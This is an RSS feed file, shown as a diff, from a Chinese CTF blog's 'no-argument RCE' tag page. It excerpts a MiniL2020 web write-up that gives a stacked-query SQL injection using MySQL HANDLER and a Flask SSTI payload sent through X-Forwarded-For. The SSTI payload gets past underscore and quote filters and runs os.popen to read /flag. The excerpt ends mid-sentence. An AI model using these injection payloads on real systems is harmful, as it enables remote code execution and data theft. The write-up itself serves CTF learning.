@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>无参数RCE on wh1sper</title>
+    <link>https://anthem-whisper.github.io/tags/%E6%97%A0%E5%8F%82%E6%95%B0rce/</link>
+    <description>Recent content in 无参数RCE on wh1sper</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 10 May 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/%E6%97%A0%E5%8F%82%E6%95%B0rce/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>MiniL2020_web_wp</title>
+      <link>https://anthem-whisper.github.io/p/minil2020_web_wp/</link>
+      <pubDate>Sun, 10 May 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/minil2020_web_wp/</guid>
+      <description>西电校赛，难度适中，本人内鬼选手，看了下题。
+ id_wife 考点：堆叠注入
+不是很难，最开始没想到堆叠，跑去盲注，差点怀疑人生
+测出来堆叠之后就简单了，其他过滤什么我不知道，直接参考新春战疫的一道sqli，Handler一把梭
+frank&#39;);handler `1145141919810` open;handler `1145141919810` read first;handler `1145141919810` read next;#minil{4cc5cda6-30c6-48ff-ab4e-9c2830005191}
+Personal_IP_Query 考察：flaskSSTI，绕过下划线、单双引号。
+学习链接
+&amp;gt;&amp;gt;flag0师傅
+&amp;gt;&amp;gt;byc_404师傅
+打开题目，显示Your Ip IS……马上想到XFF头，伪造之后发现输入的XFF头显示出来了，然后踌躇了一阵子，回头看响应包，响应头里面有一个SERVER提示这个是python的后端，那么就尝试SSTI
+输入 {{2+2}} 之后回显的 4 实锤。
+Fuzz，过滤了下划线、单双引号、没有过滤中括号
+最开始我用的是[request.value.class]那个，后来试了半天不能绕过中括号里还有引号的，后来队友改用attr(request.args.class)秒出
+在class中寻找模块exp：
+#python 3import restr = &#39;&#39;&#39;（回显信息）&#39;&#39;&#39;list = re.split(&#39;,&#39;, str)for i in range(0, len(list)):if &#39;catch_warnings&#39; in list[i]:print(i)breakplayload：
+?x1=__class__&amp;amp;x2=__base__&amp;amp;x3=__subclasses__&amp;amp;x4=__getitem__&amp;amp;x5=__init__&amp;amp;x6=__globals__&amp;amp;x7=__builtins__&amp;amp;x8=eval&amp;amp;x9=__import__(&amp;quot;os&amp;quot;).popen(&#39;cat+/flag&#39;).read()X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}复现时补充：
+我的原来那个中括号的做法时走得通的，然后os模块也可以的，只是当时可能由于某些玄学原因没成功，这里补上：
+XFF：{{ [][request.args.class][request.args.mro][1][request.args.subclasses]()[127] }}//回显：Your IP: &amp;lt;class &#39;os.</description>
+    </item>
+    
+  </channel>
+</rss>
